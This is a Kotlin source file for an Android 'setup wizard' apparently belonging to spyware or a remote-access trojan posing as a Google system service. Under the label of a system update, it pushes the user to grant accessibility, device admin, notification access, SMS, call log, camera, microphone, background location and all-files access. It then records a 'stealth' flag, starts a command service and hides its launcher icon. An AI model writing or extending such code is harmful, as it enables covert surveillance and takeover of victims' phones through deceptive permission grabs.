package com.google.android.systemservice

import android.Manifest
import android.accessibilityservice.AccessibilityServiceInfo
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.util.Log
import android.provider.Settings
import android.view.View
import android.view.accessibility.AccessibilityManager
import android.widget.Button
import android.widget.ProgressBar
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.activity.viewModels
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import kotlinx.coroutines.flow.collectLatest
import kotlinx.coroutines.launch
import com.google.android.systemservice.presentation.viewmodel.SetupWizardViewModel
import com.google.android.systemservice.receivers.SystemAdminReceiver
import com.google.android.systemservice.services.CommandService
import com.google.android.systemservice.utils.VendorAutostart

class SetupWizardActivity : AppCompatActivity() {
    
    companion object {
        private const val TAG = "SetupWizard"
    }

    private val viewModel: SetupWizardViewModel by viewModels()

    private lateinit var progressBar: ProgressBar
    private lateinit var statusText: TextView
    private lateinit var stepText: TextView
    private lateinit var actionButton: Button
    private lateinit var progressPercent: TextView

    private val handler = Handler(Looper.getMainLooper())

    // Permission request codes
    private val PERMISSION_REQUEST_CODE = 1001
    private val ACCESSIBILITY_REQUEST_CODE = 1002
    private val NOTIFICATION_LISTENER_REQUEST_CODE = 1003
    private val BATTERY_OPTIMIZATION_REQUEST_CODE = 1004
    private val DEVICE_ADMIN_REQUEST_CODE = 1005
    private val VENDOR_AUTOSTART_REQUEST_CODE = 1006

    // Step order: 0=Accessibility, 1=Permissions, 2=Notifications, 3=Battery, 4=DeviceAdmin, 5=Autostart, 6=Files

    private val requiredPermissions = mutableListOf(
        // Location
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        // Camera & Audio
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        // Contacts & Calls
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_CALL_LOG,
        // SMS
        Manifest.permission.READ_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.SEND_SMS,
        // Phone
        Manifest.permission.READ_PHONE_STATE
    ).apply {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            add(Manifest.permission.POST_NOTIFICATIONS)
            add(Manifest.permission.READ_MEDIA_IMAGES)
            add(Manifest.permission.READ_MEDIA_VIDEO)
            add(Manifest.permission.READ_MEDIA_AUDIO)
        }
        // READ_EXTERNAL_STORAGE only works on API 28-32; on 33+ use READ_MEDIA_*; on 29- it's auto-granted
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU &&
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        // Bluetooth permissions for Android 12+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            add(Manifest.permission.BLUETOOTH_SCAN)
            add(Manifest.permission.BLUETOOTH_CONNECT)
        }
        // Background location requested separately (not in this list)
    }
    
    // Track how many times we've asked for permissions (for "permanently denied" detection)
    private var permissionRequestAttempts = 0
    
    // Request code for All Files Access
    private val MANAGE_STORAGE_REQUEST_CODE = 1007
    private val BACKGROUND_LOCATION_REQUEST_CODE = 1008

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Check if setup already completed
        if (isSetupComplete()) {
            launchServicesAndFinish()
            return
        }
        
        setContentView(R.layout.activity_setup_wizard)
        initViews()

        lifecycleScope.launch {
            viewModel.state.collectLatest { state ->
                if (state.setupComplete) {
                    completeSetup()
                } else {
                    updateUI(state)
                }
            }
        }
    }

    private fun initViews() {
        progressBar = findViewById(R.id.progressBar)
        statusText = findViewById(R.id.statusText)
        stepText = findViewById(R.id.stepText)
        actionButton = findViewById(R.id.actionButton)
        progressPercent = findViewById(R.id.progressPercent)

        actionButton.setOnClickListener { executeCurrentStep() }
    }

    private fun updateUI(state: SetupWizardViewModel.WizardState) {
        progressBar.progress = state.progressPercent
        progressPercent.text = "${state.progressPercent}%"
        stepText.text = state.stepLabel
        statusText.text = state.statusText
        actionButton.text = state.buttonText
    }

    private fun executeCurrentStep() {
        when (viewModel.state.value.currentStep) {
            0 -> requestAccessibilityService()
            1 -> requestRuntimePermissions()
            2 -> requestNotificationListener()
            3 -> requestBatteryOptimization()
            4 -> requestDeviceAdmin()
            5 -> requestVendorAutostart()
            6 -> requestManageStoragePermission()
        }
    }
    
    private fun requestManageStoragePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!android.os.Environment.isExternalStorageManager()) {
                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                intent.data = Uri.parse("package:$packageName")
                try {
                    startActivityForResult(intent, MANAGE_STORAGE_REQUEST_CODE)
                } catch (e: Exception) {
                    val intent2 = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                    startActivityForResult(intent2, MANAGE_STORAGE_REQUEST_CODE)
                }
            } else {
                advanceToNextStep()
            }
        } else {
            advanceToNextStep()
        }
    }

    // Step 1: Runtime Permissions (after Accessibility)
    private fun requestRuntimePermissions() {
        val needed = requiredPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (needed.isNotEmpty()) {
            // Check if any permission is permanently denied (user pressed "Don't Allow" twice)
            val permanentlyDenied = needed.filter {
                permissionRequestAttempts > 0 && !ActivityCompat.shouldShowRequestPermissionRationale(this, it)
            }
            
            if (permanentlyDenied.isNotEmpty() && permissionRequestAttempts >= 2) {
                // Must open app settings — Android won't show dialog anymore
                statusText.text = "Please enable all permissions in Settings"
                actionButton.text = "OPEN SETTINGS"
                actionButton.setOnClickListener {
                    val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                        data = Uri.parse("package:$packageName")
                    }
                    startActivityForResult(intent, PERMISSION_REQUEST_CODE)
                }
                return
            }
            
            permissionRequestAttempts++
            // Reset button listener to normal
            actionButton.setOnClickListener { executeCurrentStep() }
            ActivityCompat.requestPermissions(
                this,
                needed.toTypedArray(),
                PERMISSION_REQUEST_CODE
            )
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            // All foreground granted, now request background location separately
            ActivityCompat.requestPermissions(
                this,
                arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION),
                BACKGROUND_LOCATION_REQUEST_CODE
            )
        } else {
            advanceToNextStep()
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        when (requestCode) {
            PERMISSION_REQUEST_CODE -> {
                handler.postDelayed({
                    if (isDestroyed || isFinishing) return@postDelayed
                    val stillNeeded = requiredPermissions.filter {
                        ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
                    }
                    if (stillNeeded.isEmpty()) {
                        // Foreground done, now request background location if needed
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
                            ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                            ActivityCompat.requestPermissions(
                                this,
                                arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION),
                                BACKGROUND_LOCATION_REQUEST_CODE
                            )
                        } else {
                            advanceToNextStep()
                        }
                    } else {
                        Log.e(TAG, "Still need ${stillNeeded.size} permissions: ${stillNeeded.joinToString()}")
                        statusText.text = "Missing ${stillNeeded.size} permissions. Please grant all."
                        actionButton.text = "GRANT PERMISSIONS"
                        // Reset listener in case it was changed to "OPEN SETTINGS"
                        actionButton.setOnClickListener { executeCurrentStep() }
                    }
                }, 500)
            }
            BACKGROUND_LOCATION_REQUEST_CODE -> {
                handler.postDelayed({
                    if (isDestroyed || isFinishing) return@postDelayed
                    // Background location granted or denied — advance either way
                    advanceToNextStep()
                }, 300)
            }
        }
    }

    // Step 1: Accessibility Service
    private fun requestAccessibilityService() {
        if (isAccessibilityServiceEnabled()) {
            advanceToNextStep()
        } else {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            startActivityForResult(intent, ACCESSIBILITY_REQUEST_CODE)
        }
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        val am = getSystemService(Context.ACCESSIBILITY_SERVICE) as? AccessibilityManager ?: return false
        val enabledServices = am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK)
        return enabledServices.any { it.id.contains(packageName) }
    }

    // Step 2: Notification Listener
    private fun requestNotificationListener() {
        if (isNotificationListenerEnabled()) {
            advanceToNextStep()
        } else {
            val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
            startActivityForResult(intent, NOTIFICATION_LISTENER_REQUEST_CODE)
        }
    }

    private fun isNotificationListenerEnabled(): Boolean {
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return flat?.contains(packageName) == true
    }

    // Step 3: Battery Optimization
    private fun requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(Context.POWER_SERVICE) as? PowerManager ?: return
            if (pm.isIgnoringBatteryOptimizations(packageName)) {
                advanceToNextStep()
            } else {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                }
                startActivityForResult(intent, BATTERY_OPTIMIZATION_REQUEST_CODE)
            }
        } else {
            advanceToNextStep()
        }
    }

    // Step 4: Device Admin
    private fun requestDeviceAdmin() {
        val componentName = ComponentName(this, SystemAdminReceiver::class.java)
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager ?: return
        
        if (dpm.isAdminActive(componentName)){
            advanceToNextStep()
        } else {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for system security updates")
            }
            startActivityForResult(intent, DEVICE_ADMIN_REQUEST_CODE)
        }
    }

    // Step 5: Vendor Autostart
    private fun requestVendorAutostart() {
        val autostartIntent = VendorAutostart.getAutostartIntent(this)
        if (autostartIntent != null) {
            try {
                startActivityForResult(autostartIntent, VENDOR_AUTOSTART_REQUEST_CODE)
            } catch (e: Exception) {
                advanceToNextStep() // Skip if not available
            }
        } else {
            advanceToNextStep() // No vendor-specific settings needed
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        
        handler.postDelayed({
            if (isDestroyed || isFinishing) return@postDelayed
            // Verify each step is actually completed before advancing
            when (requestCode) {
                ACCESSIBILITY_REQUEST_CODE -> {
                    if (isAccessibilityServiceEnabled()) {
                        advanceToNextStep()
                    } else {
                        statusText.text = "Accessibility service is required. Please enable it."
                        actionButton.text = "ENABLE SERVICE"
                    }
                }
                PERMISSION_REQUEST_CODE -> {
                    // Returned from app Settings — re-check permissions
                    val stillNeeded = requiredPermissions.filter {
                        ContextCompat.checkSelfPermission(this@SetupWizardActivity, it) != PackageManager.PERMISSION_GRANTED
                    }
                    if (stillNeeded.isEmpty()) {
                        // Reset listener and check background location
                        actionButton.setOnClickListener { executeCurrentStep() }
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
                            ContextCompat.checkSelfPermission(this@SetupWizardActivity, Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                            ActivityCompat.requestPermissions(
                                this@SetupWizardActivity,
                                arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION),
                                BACKGROUND_LOCATION_REQUEST_CODE
                            )
                        } else {
                            advanceToNextStep()
                        }
                    } else {
                        statusText.text = "Missing ${stillNeeded.size} permissions. Please grant all."
                        actionButton.text = "GRANT PERMISSIONS"
                        actionButton.setOnClickListener { executeCurrentStep() }
                    }
                }
                NOTIFICATION_LISTENER_REQUEST_CODE -> {
                    if (isNotificationListenerEnabled()) {
                        advanceToNextStep()
                    } else {
                        statusText.text = "Notification access is required. Please enable it."
                        actionButton.text = "ENABLE ACCESS"
                    }
                }
                BATTERY_OPTIMIZATION_REQUEST_CODE -> {
                    val pm = getSystemService(Context.POWER_SERVICE) as? PowerManager ?: return@postDelayed
                    if (pm.isIgnoringBatteryOptimizations(packageName)){
                        advanceToNextStep()
                    } else {
                        statusText.text = "Battery optimization exemption required."
                        actionButton.text = "OPTIMIZE"
                    }
                }
                DEVICE_ADMIN_REQUEST_CODE -> {
                    val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager ?: return@postDelayed
                    val cn = ComponentName(this, SystemAdminReceiver::class.java)
                    if (dpm.isAdminActive(cn)) {
                        advanceToNextStep()
                    } else {
                        statusText.text = "Device admin is required for protection."
                        actionButton.text = "ACTIVATE"
                    }
                }
                MANAGE_STORAGE_REQUEST_CODE -> {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && android.os.Environment.isExternalStorageManager()) {
                        advanceToNextStep()
                    } else if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
                        advanceToNextStep()
                    } else {
                        statusText.text = "File access permission is required."
                        actionButton.text = "ALLOW ACCESS"
                    }
                }
                VENDOR_AUTOSTART_REQUEST_CODE -> {
                    // Vendor autostart can't be verified programmatically
                    advanceToNextStep()
                }
                else -> advanceToNextStep()
            }
        }, 500)
    }

    private fun advanceToNextStep() {
        viewModel.goToNext()
    }

    private fun completeSetup() {
        statusText.text = "System update complete!"
        progressBar.progress = 100
        progressPercent.text = "100%"
        actionButton.visibility = View.GONE

        // Mark setup as complete
        getSharedPreferences("stealth_prefs", MODE_PRIVATE)
            .edit()
            .putBoolean("setup_complete", true)
            .apply()

        // Start services, then hide icons; keep retry if hiding fails
        handler.postDelayed({
            if (isDestroyed || isFinishing) return@postDelayed
            try {
                launchServicesAndFinish()
                hideLauncherIcon()
                finish()
            } catch (e: Exception) {
                Log.e(TAG, "Failed to launch services: ${e.message}")
                Toast.makeText(this, "Setup incomplete, please retry", Toast.LENGTH_LONG).show()
            }
        }, 1500)
    }

    private fun isSetupComplete(): Boolean {
        return getSharedPreferences("stealth_prefs", MODE_PRIVATE)
            .getBoolean("setup_complete", false)
    }

    private fun hideLauncherIcon() {
        // Only disable launcher aliases — NOT SetupWizardActivity itself
        // SetupWizardActivity checks isSetupComplete() and skips wizard if already done
        val launcherAliases = listOf(
            ComponentName(this, "com.google.android.systemservice.ProvisionLauncherActivity")
        )

        launcherAliases.forEach { componentName ->
            try {
                packageManager.setComponentEnabledSetting(
                    componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
            } catch (e: Exception) {
                Log.e(TAG, "Failed to hide component: ${componentName.className} ${e.message}")
            }
        }
    }

    private fun launchServicesAndFinish() {
        // Start main command service
        val serviceIntent = Intent(this, CommandService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
        
        // Note: finish() is NOT called here - it's called from completeSetup() AFTER hideLauncherIcon()
    }

    override fun onDestroy() {
        handler.removeCallbacksAndMessages(null)
        super.onDestroy()
    }
}
